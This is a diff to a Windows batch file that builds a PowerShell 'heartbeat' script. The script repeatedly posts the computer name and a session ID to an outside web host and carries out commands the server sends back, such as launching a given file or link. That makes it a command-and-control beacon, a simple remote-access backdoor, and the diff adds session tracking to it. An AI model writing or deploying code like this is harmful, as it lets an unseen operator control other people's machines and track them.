@@ -1,10 +1,14 @@
-@echo off 
+@echo off
+:: Generate a unique session identifier using PowerShell and store it in SESSION_ID
+for /f %%i in ('powershell -Command "[guid]::NewGuid().ToString()"') do set SESSION_ID=%%i
+
 :: Create or overwrite the PowerShell script "heartbeat.ps1"
-echo $pcName = $env:COMPUTERNAME > heartbeat.ps1
+echo $sessionId = "%SESSION_ID%" > heartbeat.ps1
+echo $pcName = $env:COMPUTERNAME >> heartbeat.ps1
 echo $url = "http://byxln4cj.atwebpages.com/update.php" >> heartbeat.ps1
 echo while ($true) { >> heartbeat.ps1
 echo     try { >> heartbeat.ps1
-echo         $response = Invoke-RestMethod -Uri $url -Method POST -Body @{ pc_name = $pcName } >> heartbeat.ps1
+echo         $response = Invoke-RestMethod -Uri $url -Method POST -Body @{ session_id = $sessionId; pc_name = $pcName } >> heartbeat.ps1
 echo         if ($response.status -eq "command") { >> heartbeat.ps1
 echo             switch ($response.type) { >> heartbeat.ps1
 echo                 "open_link" { Start-Process -FilePath $response.value -WindowStyle Maximized } >> heartbeat.ps1
